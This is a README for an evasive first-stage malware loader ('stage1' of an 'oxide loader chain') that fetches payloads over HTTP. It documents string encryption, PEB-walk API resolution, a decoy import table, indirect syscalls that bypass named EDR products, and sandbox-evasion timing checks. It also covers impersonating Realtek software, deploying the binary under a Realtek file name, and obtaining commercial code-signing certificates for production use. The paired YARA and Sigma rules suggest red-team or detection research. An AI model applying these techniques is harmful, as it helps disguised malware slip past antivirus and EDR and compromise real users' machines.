# stage1

First-stage HTTP fetcher for the oxide loader chain. Windows PE and
Linux ELF. The Windows build is the surface that matters for static-
analysis scoring — the Linux build is for development iteration.

---

## Static Cleanliness

The Windows build targets a binary that reveals no offensive intent
under `strings`, `objdump -p`, or standard VirusTotal static signals.

### Two hardenings

**1. Compile-time XOR string encryption.**
Every offensive literal (User-Agent, URL scheme + path, host default,
loaded DLL name) is written as a per-character XOR expression:

```c
static volatile const unsigned char k_ua_enc[] = {
    XE('M',0), XE('o',1), XE('z',2), ...
};
```

Each `XE(c, i)` is a constant expression that GCC folds at compile
time into a single encrypted byte (`c ^ (0x5A + i)`). The `.rodata`
section contains only the encrypted bytes; the plaintext is never
emitted to the binary.

At runtime, `xs_decode()` — marked `noinline` and reading from a
`volatile` buffer so the optimizer can't rematerialize the plaintext —
unscrambles the blob into a stack-local buffer. `xs_wipe()` zeros the
stack buffer before the scope exits.

Implementation: `src/xor_string.h`, `src/xor_string.c`.
Unit test: `tests/test_xs.c` (roundtrip + no-plaintext-in-enc check).

**2. PEB walk API resolution.**
No Windows API is linked through the IAT. `resolve_apis()` at entry
reads `gs:[0x60]` → `PEB.Ldr` → `InMemoryOrderModuleList`, matches
loaded modules by case-insensitive djb2 of the UTF-16 `BaseDllName`,
then walks each target module's export directory and matches exports
by case-insensitive djb2 of the ASCII name string. The result is a
function-pointer table (`g_api`) that every Windows call in the loader
routes through.

- kernel32.dll is found in the Ldr list (loaded as a known DLL by the
  Windows loader regardless of imports) and supplies `LoadLibraryA`
  and `ExitProcess`.
- kernelbase.dll (kernel32 dependency) supplies `VirtualAlloc`,
  `VirtualFree`, `Sleep` — kernel32's exports forward to kernelbase on
  Win10/11, so we resolve them directly.
- wininet.dll is loaded on demand via the bootstrapped `LoadLibraryA`;
  its name is the one string `resolve_apis` needs and it lives in an
  `XE()`-encrypted blob.

Implementation: `src/peb_walk.c`, `src/api_table.c`, `src/hash.h`.
Unit test: `tests/test_hash.c` (locks in djb2 constants).

### Target IAT

The S33 build shipped with **zero imports** — every Windows call was
PEB-resolved, so the linker emitted no IAT entries at all. That made
the binary an outlier on import-count statistics (legitimate small
PEs almost always import KERNEL32 + USER32). The S39 refactor moves
the IAT into the **12-15 entry common-utility band**, kept entirely
within `kernel32`, while preserving the runtime PEB-walk resolution
for every offensive call.

The decoy set (see `src/decoys.c`) is split into three tiers:

- **Tier A — pure decoys.** Addresses stored in a `__attribute__((used))`
  `void *const[]` array; the array is anchored from `decoys_run()`,
  which keeps its `-fdata-sections` section under `--gc-sections`. The
  linker resolves each pointer against a kernel32 import slot, but no
  call site is ever emitted in `.text`. Members:
  `GetCommandLineA`, `GetUserDefaultLocaleName`, `HeapAlloc`,
  `HeapFree`, `GetSystemTimeAsFileTime`, `GetCurrentThreadId`,
  `GetModuleHandleA`.
- **Tier B — light-touch.** Called once on a benign init path and the
  result XORed into a volatile sink. Reads as routine startup
  arithmetic in disassembly. Members: `GetTickCount`,
  `GetCurrentProcessId`.
- **Tier C — CRT-shape utility.** Discarded results from a
  `SetUnhandledExceptionFilter(NULL)`, a throwaway
  `WideCharToMultiByte`, and a `GetLastError` check. Adds the "looks
  like normal CRT init" weight.

```
$ x86_64-w64-mingw32-objdump -p build/stage1.exe | awk '/DLL Name:/'
        DLL Name: KERNEL32.dll
```

12 functions are imported from a single DLL (kernel32). The offensive
APIs — `VirtualAlloc`, `LoadLibraryA`, the `Internet*` suite, the
two `Nt*` wrappers — are absent from the IAT and resolved at
runtime via the PEB walk + djb2 path documented above.

Why kernel32-only: keeping the entire import set within kernel32
preserves the "no network DLL, no ntdll" property that lets the
hidden-fetch detection rule fire on the mismatch between observed
network traffic and the binary's static surface.

Freestanding build flags in `Makefile` remain:
`-nostdlib -nodefaultlibs -nostartfiles -ffreestanding
-Wl,--entry=stage1_entry`, plus `-fno-builtin-memcpy -fno-builtin-memset`
to block the compiler from emitting implicit `memcpy`/`memset` calls
on aggregate copies. `-Wl,--gc-sections` is still applied — the decoy
section survives because it is reached from used code, not because GC
is disabled.

### Verify cleanliness

Baseline commands, runnable against any build of `stage1.exe`:

```bash
# 1. No forbidden tokens in the strings dump
strings build/stage1.exe | grep -iE \
  "oxide|beacon|stage|implant|c2|http://|https://|User-Agent|Mozilla|VirtualAlloc|LoadLibrary|GetProcAddress|wininet|InternetOpen|/api/"
# -> must print nothing

# 2. IAT must be kernel32-only (no wininet / ws2_32 / ntdll)
x86_64-w64-mingw32-objdump -p build/stage1.exe | awk '/DLL Name:/ {print}'
# -> must print exactly: DLL Name: KERNEL32.dll
# Imported function count from kernel32 is expected in 12-15 (the
# common-utility decoy band — see "Target IAT" above).

# 3. Binary under 20 KB
stat -c %s build/stage1.exe
# -> must be <= 20480

# 4. Paired detection rule fires on our build
yara ../detection/yara/stage1_peb_walk.yar build/stage1.exe
# -> must print: Oxide_Stage1_PEB_Walk_x64 build/stage1.exe

# All in one shot:
make verify
```

### Unit tests

```bash
cd tests && make run
```

Builds and runs `test_hash` (djb2 constants) and `test_xs` (XS macro
roundtrip + anti-fold check) on the Linux host. Failure means the
hash contract or the string obfuscation is broken; the Windows build
should not be trusted until both pass.

---

## Build

```bash
make linux     # development iteration
make windows   # real deliverable (requires mingw-w64)
make verify    # static-cleanliness gate
make check     # size constraint
```

The Linux build keeps the plaintext User-Agent + URL pattern for
development convenience (the 0/72 goal applies to the Windows PE). The
Windows build is freestanding; no CRT, no default libraries.

## Detection pairing

Every stage1 technique ships with detections in `../detection/`:

| Technique             | YARA                                    | Sigma                                       |
|-----------------------|-----------------------------------------|---------------------------------------------|
| PEB walk + djb2       | `stage1_peb_walk.yar` (T1027.007)       | --                                          |
| Decoy IAT shape       | `stage1_decoy_iat_shape.yar` (T1027.007, T1480) | `stage1_minimal_iat.yml` (T1027.007, T1480) |
| Staging URL fetch     | `stage1_imports.yar` (legacy)           | `stage1_network.yml` (T1071.001, T1105)     |
| XOR loop magic        | `stage1_xor.yar`, `stage1_magic.yar`    | --                                          |
| Hell's Hall syscalls  | `stage1_hellshall_ssn_resolve.yar` (T1106, T1027.007) | --                            |
| OEM VERSIONINFO mimicry | `stage1_versioninfo_mimicry.yar` (T1036.005) | `stage1_cert_cn_mimicry.yml` (T1036.001) |
| Timing anti-emu probe | `stage1_qpc_sleep_divergence_check.yar` (T1497.003, T1480) | `stage1_long_sleep_pre_network.yml` (T1497.003, T1480) |

---

## Syscall Layer (S34, Hell's Hall)

Layered on top of the S33 zero-IAT + PEB-walk foundation. For two Nt*
calls in the payload-execution path -- `NtAllocateVirtualMemory` and
`NtProtectVirtualMemory` -- stage1 does NOT invoke the ntdll stub
prologue (the first ~10 bytes of each `Nt*` export, which is where
userland EDRs install inline hooks). Instead, it:

1. Resolves the System Service Number (SSN) for each target at runtime
   by reading the first bytes of the ntdll stub and checking against the
   canonical prologue pattern `4C 8B D1 B8 <SSN lo> <SSN hi> 00 00`
   (Hell's Gate read, `src/syscalls.c:hellsgate_read`).
2. Cross-validates the result against a FreshyCalls-style VA-sorted
   index -- count how many `Nt*` exports in ntdll have a lower RVA than
   the target; that count IS the SSN
   (`src/syscalls.c:freshy_ssn`). This path never reads stub bytes, so
   it survives any inline-hook layout including uniform-prefix hooks.
3. Scans ntdll's executable sections for the first `0F 05 C3`
   (`syscall; ret`) gadget and caches the pointer
   (`src/syscalls.c:find_syscall_gadget`).
4. Invokes the syscall via a three-instruction naked trampoline (file-
   scope `__asm__` block at the bottom of `src/syscalls.c`) that does
   `mov r10, rcx` (x64 syscall ABI), `mov eax, <cached SSN>`, then
   `jmp *<cached gadget>`. The gadget's `ret` pops the C caller's
   original return address so control returns to the caller in the
   normal Win64 ABI sense -- with RIP at kernel entry pointing into
   ntdll, not stage1.

Downstream, `src/mem_exec_win.c` uses these two wrappers to allocate the
payload buffer as `PAGE_READWRITE`, copy the payload, then flip the
pages to `PAGE_EXECUTE_READ` via `NtProtectVirtualMemory`. The buffer is
never simultaneously writable and executable -- the RWX-private ETW-TI
signal (`EtwTiLogAllocExecVm`) does not fire.

**What this defeats:** userland inline hooks on the resolved Nt*
functions (CrowdStrike Falcon, SentinelOne InProcessClient64.dll,
Sophos Intercept X); the module-boundary check used by Elastic's
`direct_syscall` behavior tag (`ntdll` is the final return-address
frame, not stage1's .text).

**What this does NOT defeat:** full call-stack unwinding (Elastic 8.11+,
CrowdStrike Intel-PT-backed analysis); `PsAltSystemCallHandlers` and
kernel ETW-TI providers, which MDE uses as its primary detection path
(there are no userland hooks for MDE); and behavioral AI models that
correlate unbacked-memory origins with syscall telemetry. Stack
spoofing / synthetic frames are the next-layer defeat for those, and
are explicitly deferred to a later session.

---

## Anti-Emulation Timing Probe (S40)

Three timing-based execution-environment guards that run early in
`stage1_entry` -- after `decoys_run()` (S39) and before `resolve_apis()`
(S33+S34). On real hardware all guards complete in roughly 9.5 s and
the loader continues to its existing fetch path. On environments that
fake `Sleep` or skip CPU-bound loops, the guards self-terminate the
process via `ExitProcess(0)` before any network or syscall surface is
touched.

The probe is self-contained in `src/anti_emu.c` and resolves its four
needed kernel32 exports (`Sleep`, `ExitProcess`, `QueryPerformance-
Counter`, `QueryPerformanceFrequency`) through the existing PEB walk
(`peb_find_module` + `peb_find_export`, djb2 hashes from
`src/hash.h`). None of the four appear in the IAT -- the S39 12-entry
common-utility silhouette is preserved verbatim.

| Guard | Mechanism | Floor (real HW always passes) | Trips on |
|-------|-----------|-------------------------------|----------|
| 1 | QPC bracket around `Sleep(8000)`, `(T1-T0)*1000/freq >= 3200 ms` | 4800 ms of headroom over scheduler jitter | Sleep-skip emulators (Cuckoo-class, fast static + emu-assist scanners) |
| 2 | Bounded QPC loop, 1500 ms wall-clock window, `iter >= 1_000_000` | ~100x conservative (modern CPUs sustain 100M+ iter / 1.5 s) | Iteration-bounded emulators that fake QPC delta but cap the body |
| 3 | CPUID leaf 1, ECX bit 31 (HV-present) | informational only, never gates | -- (lab is KVM, bit always set) |

**Why no IAT entry for QPC/QPF:** static analysers cluster on
"timing-API import + Sleep import + small PE" as a strong probe-class
signal. PEB-walking the four functions denies that conjunction. The
S39 12-entry kernel32-utility silhouette is unchanged: still
`GetCommandLineA`, `GetCurrentProcessId`, `GetCurrentThreadId`,
`GetLastError`, `GetModuleHandleA`, `GetSystemTimeAsFileTime`,
`GetTickCount`, `GetUserDefaultLocaleName`, `HeapAlloc`, `HeapFree`,
`SetUnhandledExceptionFilter`, `WideCharToMultiByte`.

**Stack hygiene:** all QPC `LARGE_INTEGER` locals plus the four
`volatile` function-pointer slots are zeroed via volatile-pointer
writes immediately before `ExitProcess(0)` on the fail path (and
before normal return on the pass path). A post-mortem memory dump
will not yield the resolved kernel32 export addresses or the timing
deltas.

**Detection pairing:**

- `detection/yara/stage1_qpc_sleep_divergence_check.yar` -- byte
  pattern of the `imul rax, rax, 0x3E8` + `div [rsp+...]` + `cmp rax,
  imm32` arithmetic block, gated on the kernel32-only sub-16KB
  silhouette and the absence of QPC/Sleep IAT entries.
  Mapped to T1497.003 (Time Based Evasion) + T1480.
- `detection/sigma/stage1_long_sleep_pre_network.yml` -- behavioural
  rule: small PE, 7+ s quiet startup, then first outbound HTTP. Hunt
  template, high-FP on its own; chain with PE-size + signer-cluster
  + parent-process filters before promoting.

**What this defeats:** automated triage rigs that shortcut `Sleep` to
keep the analysis budget down (Cuckoo default config without
"force_sleep_skip=false", several public emu-assist scanners that
treat `Sleep` as a no-op).

**What this does NOT defeat:** full hardware-virt sandboxes (CAPE,
Hatching Triage with faithful TSC/HPET virtualisation), which
execute `Sleep` and the CPU-loop honestly. Those are the next layer
and require a different probe family (e.g. CPUID-fingerprint
allowlist, network-egress dependency, or human-interaction proofs).
Explicitly out of scope for S40.

**References:**
- [am0nsec/HellsGate](https://github.com/am0nsec/HellsGate) -- the
  reference Hell's Gate C implementation
- [trickster0/TartarusGate](https://github.com/trickster0/TartarusGate)
  -- Halo's and Tartarus extensions for hook tolerance
- [Maldev-Academy/HellHall](https://github.com/Maldev-Academy/HellHall)
  -- indirect-syscall variant (ntdll-resident gadget)
- [JoasASantos/SysWhispers4](https://github.com/JoasASantos/SysWhispers4)
  -- FreshyCalls sort-index + 8 resolution methods
- Research wave 2026-04-23 (fact-checked):
  `hells-hall-variants-2026_RESEARCH.md`,
  `win11-24h2-syscall-stability_RESEARCH.md`,
  `edr-userland-hooks-2026_RESEARCH.md`

---

## Cosmetic Layer (S34, PE VERSIONINFO + manifest + icon + self-sign)

### Persona

**Realtek HD Audio Manager Helper** (`RtkAudHlpr.exe` class). Chosen per
`versioninfo-mimicry-detection_RESEARCH.md` (2026-04-23). Rationale:

- Microsoft impersonation (`CompanyName = "Microsoft Corporation"`) is
  the single most scrutinized string in public YARA rulesets; every rule
  author writes the "unsigned + Microsoft claim" check first. Detection
  risk outweighs the autoruns-hide benefit.
- Security-vendor impersonation (Sophos, Bitdefender) is under active
  threat-intel coverage from 2024 campaigns.
- Niche OEM vendors (Realtek, Synaptics, Dell, HP, Conexant) still
  deliver the Defender ML trust-signal bonus from populated metadata
  without inheriting heavy active-coverage weight. Realtek specifically
  has the highest install-base baseline on Windows endpoints, so an
  anomalous Realtek binary is less of a baseline outlier.

Fields populated in `resources/stage1.rc`:

| Field            | Value                                          |
|------------------|------------------------------------------------|
| CompanyName      | Realtek Semiconductor Corp.                    |
| FileDescription  | Realtek HD Audio Manager Helper                |
| FileVersion      | 6.0.9501.1                                     |
| InternalName     | RtkAudHlpr                                     |
| OriginalFilename | RtkAudHlpr.exe (**must match deployed name**)  |
| ProductName      | Realtek HD Audio                               |
| ProductVersion   | 6.0.9501.1                                     |
| LegalCopyright   | Copyright (C) Realtek Semiconductor Corp.      |

**Deployment:** deploy the built `stage1.exe` AS `RtkAudHlpr.exe`. A
mismatch between `OriginalFilename` and `basename(Image)` fires
Sysmon-based Trickbot-class detection rules.

### Icon

Current `resources/icon.ico` is a **lab placeholder** -- synthesized
16x16 4bpp with ImageMagick. No real Realtek icon is extracted; the
licensing posture for Windows-binary icon extraction is gray, and the
placeholder keeps the repo self-contained. To swap in a real extracted
icon for production-grade mimicry, replace `resources/icon.ico` with an
extract from an actual Realtek binary (e.g. `wrestool -t 14 -x
RAVCpl64.exe`) and rebuild. `stage1.rc` does not need changes.

### Manifest

`resources/manifest.xml` declares `asInvoker` (no elevation request),
`uiAccess=false`, and `PerMonitorV2` DPI awareness. `supportedOS` lists
both Windows 10 and Windows 11 GUIDs. Compiled into the PE via windres
as RT_MANIFEST id=1.

### Timestamp

`tools/set_timestamp.py` rewrites `IMAGE_FILE_HEADER.TimeDateStamp` to
**2025-10-15 14:00:00 UTC** (fixed six months before the 2026-04-23
ship date, round hour). Fresh-within-72h timestamps are a mild
detection signal; epoch 0 / 1970 is a stronger one; a realistic
non-fresh date reads as normal for a signed OEM utility. Must run
before signing -- the TimeDateStamp is inside the Authenticode hash
range.

### Self-signing

`sign.sh` creates a lab CA + code-signing cert under `sign-cert/`
(gitignored) on first run, reuses them thereafter. Subject DN:
`CN=Oxide Labs Code Signing, O=Oxide Research`. Signs the binary with
`osslsigncode sha256` and a DigiCert timestamp URL. The resulting PE
verifies under its own chain but fails commercial-root validation
(expected for a lab CA).

**Swap-in for production-grade signing:**

1. Acquire a commercial code-signing cert:
   - OV cert: [SSL.com Code Signing](https://www.ssl.com/certificates/code-signing/)
     (~$129/yr), [Certum Open Source Code Signing](https://shop.certum.eu/)
     (~$116/yr). OV is sufficient for the "signed by a known CA" trust
     tier but does NOT grant SmartScreen base reputation.
   - EV cert (~$300-500/yr): grants SmartScreen base reputation from day
     one. Requires hardware token (YubiKey / eToken) per the 2023 key-
     storage mandate. Not directly usable from Linux; sign via Windows
     VM or vendor cloud-signing API.
   - [Microsoft Trusted Signing](https://www.microsoft.com/en-us/security/trusted-signing)
     (individual registration, ~$10/mo): 3-day cert validity window,
     full SmartScreen reputation. Documented abuse vector in 2024-2025
     malware campaigns; use aware of detection posture.
2. Point `sign.sh` at the new cert/key (env vars or script edit).
3. Same `osslsigncode sign` invocation; the toolchain is identical.

Never commit `.key`, `.p12`, or `.pfx` material. `.gitignore` enforces.

---
